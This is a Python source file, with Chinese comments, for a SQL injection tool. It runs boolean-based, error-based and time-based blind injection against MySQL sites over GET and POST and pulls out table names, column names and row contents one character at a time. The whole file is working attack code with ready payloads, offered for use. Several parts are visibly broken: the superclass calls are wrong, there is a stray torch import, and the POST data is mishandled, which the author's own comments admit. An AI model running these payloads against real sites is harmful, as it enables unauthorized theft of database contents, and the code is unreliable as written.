import time
import urllib.parse
import requests
import sys
import getopt
import json
import re
from urllib.parse import urlparse, parse_qs, urlencode,unquote_plus

from torch._dynamo.variables import dicts


# get method to blind
class Blind():
    def __init__(self, url, base):
        self.url = url
        self.methods = 'GET'
        self.tables = ""
        self.columns = ""
        self.base = base

    def start(self):


        if self.base == '3':
            print("*********正在进行普通布尔盲注*****")
            b3 = b_3_blind(self.url)
            b3.run()

        elif self.base == '2':
            print("*********正在进行报错盲注*****")

            b2 = b_2_blind(self.url)
            b2.run()

        elif self.base == '1':
            print("*********正在进行时间盲注*****")

            b1 = b_1_blind(self.url)
            b1.run()

    # post 方法

#post method to blind
class BlindPost():
    def __init__(self, url, data, base):
        self.url = url
        self.methods = 'POST'
        self.tables = ""
        self.columns = ""
        self.base = base
        # 下面这个是将参数提取成字典格式 后来几个模块用了 parseurl 这个为了支持b_2_p_blind  以后再改
        self.datas = data
        print("注意!~post请求的url必须 加上 最后的 / ")
        dic = {}
        item = str(self.datas).split('&')

        for i in item:
            try:
                k, v = i.split('=')
                dic[k] = v
            except Exception as e:
                pass


        self.datas = dic




    def start(self):
        if self.base == '3':
            b3_p = b_3_p_blind(self.url,self.datas)
            b3_p.run()

        if self.base == '2':
            b2_p = b_2_p_blind(self.url, self.datas)
            b2_p.run()

        if self.base == '1':
            b1_p = b_1_p_blind(self.url, self.datas)
            b1_p.run()

#common base return page feature blind
#下面这个模块大概有bug 太懒了没来得及测试
#以后更新再说 ：》
class b_3_blind(Blind):

    def __init__(self,url):

        super().__init__(self,url)
        self.tables = input("若已知表名请输入 否则直接回车：")
        print("-----------------------------------------")
        self.columns = input("若已知列名请输入（只能输一列）否则直接回车：")
        print("-----------------------------------------")
        self.fet = input("输入盲注的特征信息:")
        print("-----------------------------------------")
        self.url = url
        self.datas = parse_qs(urlparse(self.url).query)

    def pwn_tables(self):
        tables = ""

        if self.tables:
            print("[*]当前已知数据库表为" + self.tables)

        else:
            print("未知数据库表名 正在爆破。。。。。")
            print("-----------------------------------------")

            try:
                for k, v in self.datas.items():
                    for i in range(1, 30):  # sql substr从1开始

                        l = 32
                        h = 127
                        mid = (l + h) // 2

                        while l < h:
                            p = f"' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},1,0)%23"
                            self.datas[k] = v[0] + f"{p}"
                            urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"

                            if self.fet in requests.get(url=urls).text:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 32 or mid == 127:
                            break
                        tables += chr(mid)
                        print(tables)
                    print(f"-----------[*]表名:{tables}----------------")
                    self.tables = tables  # 将表名转为16进制防止 引号被过滤

            except Exception as e:
                print(e)

    def pwn_columns(self):
        columns = ""
        if self.columns:
            print("[*]当前已知数据库列为" + self.columns)
            print("正在爆破字段。。。。。。。。。")
            self.pwn_field()

        else:
            print("未知当选数据库列 正在爆破。。。。。。。")
            tt = self.tables.split(',')
            if len(tt) > 1:
                self.tables = input("输入需要查询的表:")


            table = "0x" + "".join(f"{ord(char):02x}" for char in self.tables)
            try:
                for k, v in self.datas.items():
                    for i in range(1, 30):

                        l = 33
                        h = 126
                        mid = (l + h) // 2

                        while l < h:  # 二分查找不加等号
                            p2 = f"' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={table}),{i},1))>{mid},1,0)%23"
                            self.datas[k] = v[0] + f"{p2}"
                            urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"

                            if self.fet in requests.get(url=urls).text:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        columns += chr(mid)
                        print(columns)

                    print(f"---------[*]列为{columns}--------------")
                    c = input("选择需要查询的列 只能查一列")
                    self.columns = c
                    self.pwn_field()



            except Exception as e:
                print(e)

    def pwn_field(self):
        fields = ""
        try:
            for k, v in self.datas.items():
                for n in range(30): #查当前列的所有字段 30为限度
                    for i in range(1, 30):
                        l = 33
                        h = 126
                        mid = (l + h) // 2



                        while l < h:  # 二分查找不加等号
                            p3 = f"' and if(ascii(substr((select {self.columns} from {self.tables} limit {n},1),{i},1))>{mid},1,0)%23"
                            self.datas[k] = v[0] + f"{p3}"

                            urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"
                            if self.fet in requests.get(url=urls).text:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        fields += chr(mid)
                        print(fields)
                    print(f"[*]此时字段为 {fields}")


        except Exception as e:
            print(e)

    def run(self):
        self.pwn_tables()
        self.pwn_columns()

# 可能这个模块有bug 懒得改了 以后再说
class b_3_p_blind(BlindPost):

    def __init__(self,url,datas):

        super().__init__(url, datas)
        self.tables = input("若已知表名请输入 否则直接回车：")
        print("-----------------------------------------")
        self.columns = input("若已知列名请输入（只能输一列）否则直接回车：")
        print("-----------------------------------------")
        self.fet = input("输入盲注的特征信息:")
        print("-----------------------------------------")
        self.url = url
        self.datas = parse_qs(urlparse(self.url).query)

    def pwn_tables(self):
        tables = ""

        if self.tables:
            print("[*]当前已知数据库表为" + self.tables)

        else:
            print("未知数据库表名 正在爆破。。。。。")
            print("-----------------------------------------")

            try:

                for k,v in self.datas.items():

                    for i in range(1, 30):  # sql substr从1开始
                        l = 32
                        h = 127
                        mid = (l + h) // 2

                        while l < h:
                            p = f"' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},1,0) #"
                            self.datas[k] = v[0] + f"{p}"

                            if self.fet in requests.post(url=self.url,data=self.datas).text:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 32 or mid == 127:
                            break
                        tables += chr(mid)
                        print(tables)
                    print(f"-----------[*]表名:{tables}----------------")
                    self.tables = tables  # 将表名转为16进制防止 引号被过滤

            except Exception as e:
                print(e)

    def pwn_columns(self):
        columns = ""
        if self.columns:
            print("[*]当前已知数据库列为" + self.columns)
            print("正在爆破字段。。。。。。。。。")
            self.pwn_field()

        else:
            print("未知当选数据库列 正在爆破。。。。。。。")
            tt = self.tables.split(',')
            if len(tt) > 1:
                self.tables = input("输入需要查询的表:")


            table = "0x" + "".join(f"{ord(char):02x}" for char in self.tables)
            try:
                for k, v in self.datas.items():

                    for i in range(1, 30):

                        l = 33
                        h = 126
                        mid = (l + h) // 2

                        while l < h:  # 二分查找不加等号
                            p2 = f"' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={table}),{i},1))>{mid},1,0) #"

                            self.datas[k] = v[0] + f"{p2}"
                            if self.fet in requests.post(url=self.url ,data=self.datas).text:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        columns += chr(mid)
                        print(columns)

                    print(f"---------[*]列为{columns}--------------")
                    c = input("选择需要查询的列 只能查一列")
                    self.columns = c
                    self.pwn_field()



            except Exception as e:
                print(e)

    def pwn_field(self):
        fields = ""
        try:
            for k, v in self.datas.items():
                for n in range(30): #查当前列的所有字段 30为限度
                    for i in range(1, 30):
                        l = 33
                        h = 126
                        mid = (l + h) // 2
                        p3 = f"' and if(ascii(substr((select {self.columns} from {self.tables} limit {n},1),{i},1))>{mid},1,0) #"
                        self.datas[k] = v[0] + f"{p3}"
                        while l < h:  # 二分查找不加等号

                            if self.fet in requests.post(url=self.url ,data=self.datas).text:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        fields += chr(mid)
                        print(fields)
                    print(f"[*]此时字段为 {fields}")


        except Exception as e:
            print(e)

    def run(self):
        self.pwn_tables()
        self.pwn_columns()

#base error blind finished
class b_2_blind(Blind) :
    def __init__(self, url):
        super().__init__(self, url)
        self.url = url
        self.error_info = ""
        self.error_tables = ""
        self.error_columns = ""
        self.error_fields = ""
        self.datas = parse_qs(urlparse(self.url).query)

    def pwn_info(self):
        global flag
        flag = 0
        pay_v =["' and extractvalue(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir)) %23","' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1) %23"]
        try:
            print("[+] 正在获取数据库基本信息")

            for k,v in self.datas.items():
                for p in pay_v:

                    self.datas[k] = v[0] + f"{p}"

                    urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"

                    texts = requests.get(url=urls).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_info = re.findall(pa, texts)
                    if self.error_info:

                        print(f"[*]当前数据库名 用户名 目录地址 分别 为 {self.error_info}")
                        flag = 1
                        break
                if flag:
                    break
            if not flag:
                print("[-] 报错注入未获取到数据库有关信息")

        except Exception as e:
            pass

    def pwn_tables(self):
        global flag
        flag = 0
        pay_d = ["' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) %23","' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23"]

        print("[+] 正在获取数据库表的信息")

        try:
            flag = 0
            for k, v in dict(self.datas).items():
                for p in pay_d:
                    self.datas[k] = v[0] + f"{p}"

                    urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"


                    texts = requests.get(url=urls).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_tables = re.findall(pa, texts)

                    if self.error_tables:
                        print(f"[*]当前数据库表为{self.error_tables}")
                        flag = 1
                        table = input("选择你要查询的表:")
                        self.error_tables = table

                        break
                if flag:
                    break

            if not flag:
                print("[-] 报错注入未获取到数据库表的有关信息")





        except Exception as e:
            pass


    def pwn_columns(self):
        global flag
        flag = 0
        print("[+] 正在获取数据库列的相关信息")
        table = "0x" + "".join(f"{ord(char):02x}" for char in self.error_tables)
        pay_c = [f"' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={table}),0x7e),1) %23","' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) %23"]

        try:
            flag = 0
            for k, v in dict(self.datas).items():
                for p in pay_c:
                    self.datas[k] = v[0] + f"{p}"

                    urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"

                    texts = requests.get(url=urls).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_columns = re.findall(pa, texts)
                    if self.error_columns:
                        print(f"[*]当前数据库列为:{self.error_columns}")
                        self.error_columns = input("输入需要查询的列 中间以 ‘,’ 隔开：")
                        flag = 1
                        break
                if flag:
                    break


            if not flag:
                print("[-] 报错注入未获取到数据库 列有关信息")


        except Exception as e:
            pass

    def pwn_fields(self):
        global flag
        flag = 0
        print("[+] 正在获取数据库字段内容的相关信息")
        item = self.error_columns.split(',')

        p = [i + ",0x7a" for i in item]
        pp = ",".join(p)

        pay_f = [f"' and extractvalue(1,concat(0x7e,(select group_concat({pp}) from {self.error_tables}))) %23",f"' and updatexml(1,concat(0x7e,(select group_concat({pp}) from {self.error_tables}),0x7e),1) %23"]
        try:
            flag = 0
            for k, v in dict(self.datas).items():
                for p in pay_f:
                    self.datas[k] = v[0] + f"{p}"

                    urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse( self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"

                    texts = requests.get(url=urls).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_fields = re.findall(pa, texts)
                    if self.error_fields:
                        print(f"[*]当前数据库字段(部分可能存在显示不全，乱码的情况)内容为:")
                        print("--------------------------")
                        for i in item:
                            print(f"{i}   |", end="\t")
                        print("\n")
                        for j in str(self.error_fields[0]).split(','):
                            print(f"|{j}                    |",end="\t")
                            print("\n")

                        print("--------------------------")

                        flag = 1
                        break
                if flag:
                    break
            if not flag:
                print("[-] 报错注入未获取到数据库字段内容有关信息")

        except Exception as e:
            pass



    def run(self):
        self.pwn_info()
        self.pwn_tables()
        self.pwn_columns()
        self.pwn_fields()


#这里的b_2_p_blind 将参数分解 没有用urlparse
#太累了 懒得改了
class b_2_p_blind(BlindPost) :
    def __init__(self, url,data):
        super().__init__(self, url,data)
        self.url = url
        self.datas = data
        self.error_info = ""
        self.error_tables = ""
        self.error_columns = ""
        self.error_fields = ""

    def pwn_info(self):
        global flag
        flag = 0
        pay_v =["' and extractvalue(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir)) #","' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1) #"]
        try:
            print("[+] 正在获取数据库基本信息")

            for k,v in dict(self.datas).items():
                for p in pay_v:

                    vp = v + p
                    temp_dict = dict(self.datas)
                    temp_dict[k] = vp

                    json_temp_dict = temp_dict

                    texts = requests.post(url=self.url, data=json_temp_dict).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_info = re.findall(pa, texts)
                    if self.error_info:

                        print(f"[*]当前数据库名 用户名 目录地址 分别 为 {self.error_info}")
                        flag = 1
                        break
                if flag:
                    break
            if not flag:
                print("[-] 报错注入未获取到数据库有关信息")

        except Exception as e:
            pass

    def pwn_tables(self):
        global flag
        flag = 0
        pay_d = ["' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #","' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #"]

        print("[+] 正在获取数据库表的信息")

        try:
            flag = 0
            for k, v in dict(self.datas).items():
                for p in pay_d:

                    vp = v + p
                    temp_dict = dict(self.datas)
                    temp_dict[k] = vp

                    json_temp_dict = temp_dict
                    texts = requests.post(url=self.url, data=json_temp_dict).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_tables = re.findall(pa, texts)

                    if self.error_tables:
                        print(f"[*]当前数据库表为{self.error_tables}")
                        flag = 1
                        table = input("选择你要查询的表:")
                        self.error_tables = table

                        break
                if flag:
                    break

            if not flag:
                print("[-] 报错注入未获取到数据库表的有关信息")





        except Exception as e:
            pass


    def pwn_columns(self):
        global flag
        flag = 0
        print("[+] 正在获取数据库列的相关信息")
        table = "0x" + "".join(f"{ord(char):02x}" for char in self.error_tables)
        pay_c = [f"' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={table}),0x7e),1) #",f" and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={table}))) #"]

        try:
            flag = 0
            for k, v in dict(self.datas).items():
                for p in pay_c:

                    vp = v + p
                    temp_dict = dict(self.datas)
                    temp_dict[k] = vp

                    json_temp_dict = temp_dict
                    texts = requests.post(url=self.url, data=json_temp_dict).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_columns = re.findall(pa, texts)
                    if self.error_columns:
                        print(f"[*]当前数据库列为:{self.error_columns}")
                        self.error_columns = input("输入需要查询的列 中间以 ‘,’ 隔开：")
                        flag = 1
                        break
                if flag:
                    break


            if not flag:
                print("[-] 报错注入未获取到数据库 列有关信息")


        except Exception as e:
            pass

    def pwn_fields(self):
        global flag
        flag = 0
        print("[+] 正在获取数据库字段内容的相关信息")
        item = self.error_columns.split(',')

        p = [i + ",0x7a" for i in item]
        pp = ",".join(p)

        pay_f = [f"' and extractvalue(1,concat(0x7e,(select group_concat({pp}) from {self.error_tables}))) #",f"' and updatexml(1,concat(0x7e,(select group_concat({pp}) from {self.error_tables}),0x7e),1) #"]
        try:
            flag = 0
            for k, v in dict(self.datas).items():
                for p in pay_f:

                    vp = v + p
                    temp_dict = dict(self.datas)
                    temp_dict[k] = vp

                    json_temp_dict = temp_dict
                    texts = requests.post(url=self.url, data=json_temp_dict).text
                    pa = re.compile(r"'(.*?)'")
                    self.error_fields = re.findall(pa, texts)
                    if self.error_fields:
                        print(f"[*]当前数据库字段(部分可能存在显示不全，乱码的情况)内容为:")
                        print("--------------------------")
                        for i in item:
                            print(f"{i}   |", end="\t")
                        print("\n")
                        for j in str(self.error_fields[0]).split(','):
                            print(f"|{j}                    |",end="\t")
                            print("\n")

                        print("--------------------------")

                        flag = 1
                        break
                if flag:
                    break
            if not flag:
                print("[-] 报错注入未获取到数据库字段内容有关信息")

        except Exception as e:
            pass



    def run(self):
        self.pwn_info()
        self.pwn_tables()
        self.pwn_columns()
        self.pwn_fields()




#time base blind
class b_1_blind(Blind) :
    def __init__(self, url):
        super().__init__(self,url)
        print("您使用的基于时间盲注的脚本 运行时间较长请内心等待 :)")
        self.t = float(input("请输入盲注的时间(如2,3,4。。)："))
        self.tables = input("若已知需要查询的表请输入 否则直接回车即可：")
        self.columns = input("若已知列请输入（只能输入一列）否则回车即可：")
        self.url = url
        self.datas = parse_qs(urlparse(self.url).query)

    def pwn_tables(self):
        tables = ""
        if self.tables:
            print("[*]当前已知数据库表为" + self.tables)

        else:
            print("未知数据库表名 正在爆破。。。。。")
            print("-----------------------------------------")

            try:
                for k, v in self.datas.items():
                    for i in range(1, 30):  # sql substr从1开始

                        l = 32
                        h = 127
                        mid = (l + h) // 2

                        while l < h:
                            p = f" or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep({int(self.t)}),0) %23"
                            self.datas[k] = v[0] + f"{p}"
                            urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(unquote_plus(urlencode(self.datas)))}"
                            print(urls)
                            t1 = time.time()
                            requests.get(url=urls)

                            t2 = time.time()

                            if t2 - t1 > self.t:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 32 or mid == 127:
                            break
                        tables += chr(mid)
                        print(tables)
                    print(f"-----------[*]表名:{tables}----------------")
                    self.tables = tables  # 将表名转为16进制防止 引号被过滤

            except Exception as e:
                print(e)

    def pwn_columns(self):
        columns = ""
        if self.columns:
            print("[*]当前已知数据库列为" + self.columns)
            print("正在爆破字段。。。。。。。。。")
            self.pwn_field()

        else:
            print("未知当选数据库列 正在爆破。。。。。。。")
            tt = self.tables.split(',')
            if len(tt) > 1:
                self.tables = input("输入需要查询的表:")


            table = "0x" + "".join(f"{ord(char):02x}" for char in self.tables)
            try:
                for k, v in self.datas.items():
                    for i in range(1, 30):

                        l = 33
                        h = 126
                        mid = (l + h) // 2

                        while l < h:  # 二分查找不加等号
                            t1 = time.time()
                            p2 = f" or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={table}),{i},1))>{mid},sleep({int(self.t)}),0)) %23"
                            self.datas[k] = v[0] + f"{p2}"
                            urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"

                            requests.get(url=urls)
                            t2 = time.time()

                            if t2 - t1 > self.t:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        columns += chr(mid)
                        print(columns)

                    print(f"---------[*]列为{columns}--------------")
                    c = input("选择需要查询的列 只能查一列")
                    self.columns = c
                    self.pwn_field()



            except Exception as e:
                print(e)

    def pwn_field(self):
        fields = ""
        try:
            for k, v in self.datas.items():
                for n in range(30): #查当前列的所有字段 30为限度
                    for i in range(1, 30):
                        l = 33
                        h = 126
                        mid = (l + h) // 2


                        while l < h:  # 二分查找不加等号
                            p3 = f" or if(ascii(substr((select {self.columns} from {self.tables} limit {n},1),{i},1))>{mid},sleep({int(self.t)}),0) %23"
                            self.datas[k] = v[0] + f"{p3}"
                            urls = urlparse(self.url).scheme + "://" + urlparse(self.url).netloc + urlparse(self.url).path + '?' + f"{unquote_plus(urlencode(self.datas))}"
                            t1 = time.time()
                            requests.get(url=urls)
                            t2 = time.time()

                            if t2 - t1 > self.t:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        fields += chr(mid)
                        print(fields)
                    print(f"[*]此时字段内容为 {fields}")


        except Exception as e:
            print(e)

    def run(self):
        self.pwn_tables()
        self.pwn_columns()
class b_1_p_blind(BlindPost) :

    def __init__(self,url,data):
        super().__init__(self,url,data)
        self.t = float(input("请输入盲注的时间"))
        self.tables = input("若已知需要查询的表请输入 否则直接回车即可：")
        self.columns = input("若已知列请输入（只能输入一列）否则回车即可：")
        self.url = url
        self.datas = parse_qs(urlparse(self.url).query)

    def pwn_tables(self):
        tables = ""
        if self.tables:
            print("[*]当前已知数据库表为" + self.tables)

        else:
            print("未知数据库表名 正在爆破。。。。。")
            print("-----------------------------------------")

            try:
                for k, v in self.datas.items():
                    for i in range(1, 30):  # sql substr从1开始

                        l = 32
                        h = 127
                        mid = (l + h) // 2

                        while l < h:
                            p = f"' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep({int(self.t)}),0) #"
                            self.datas[k] = v[0] + f"{p}"
                            t1 = time.time()
                            requests.post(url=self.url,data=self.datas)
                            t2 = time.time()

                            if t2 - t1 >= self.t:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 32 or mid == 127:
                            break
                        tables += chr(mid)
                        print(tables)
                    print(f"-----------[*]表名:{tables}----------------")
                    self.tables = tables  # 将表名转为16进制防止 引号被过滤

            except Exception as e:
                print(e)

    def pwn_columns(self):
        columns = ""
        if self.columns:
            print("[*]当前已知数据库列为" + self.columns)
            print("正在爆破字段。。。。。。。。。")
            self.pwn_field()

        else:
            print("未知当选数据库列 正在爆破。。。。。。。")
            tt = self.tables.split(',')
            if len(tt) > 1:
                self.tables = input("输入需要查询的表:")

            table = "0x" + "".join(f"{ord(char):02x}" for char in self.tables)
            try:
                for k, v in self.datas.items():
                    for i in range(1, 30):

                        l = 33
                        h = 126
                        mid = (l + h) // 2

                        while l < h:  # 二分查找不加等号
                            p2 = f"' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={table}),{i},1))>{mid},sleep({int(self.t)}),0) #"

                            self.datas[k] = v[0] + f"{p2}"
                            t1 = time.time()
                            requests.post(url=self.url,data=self.datas)
                            t2 = time.time()

                            if t2 - t1 >= self.t:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        columns += chr(mid)
                        print(columns)

                    print(f"---------[*]列为{columns}--------------")
                    c = input("选择需要查询的列 只能查一列")
                    self.columns = c
                    self.pwn_field()



            except Exception as e:
                print(e)

    def pwn_field(self):
        fields = ""
        try:
            for k, v in self.datas.items():
                for n in range(30):  # 查当前列的所有字段 30为限度
                    for i in range(1, 30):
                        l = 33
                        h = 126
                        mid = (l + h) // 2

                        while l < h:  # 二分查找不加等号
                            p3 = f"' and if(ascii(substr((select {self.columns} from {self.tables} limit {n},1),{i},1))>{mid},sleep({int(self.t)}),0)  #"
                            self.datas[k] = v[0] + f"{p3}"
                            t1 = time.time()
                            requests.get(url=self.url, data=self.datas)
                            t2 = time.time()

                            if t2 - t1 > self.t:
                                l = mid + 1
                            else:
                                h = mid
                            mid = (l + h) // 2

                        if mid == 33 or mid == 126:
                            break
                        fields += chr(mid)
                        print(fields)
                    print(f"[*]此时字段为 {fields}")


        except Exception as e:
            print(e)

    def run(self):
        self.pwn_tables()
        self.pwn_columns()

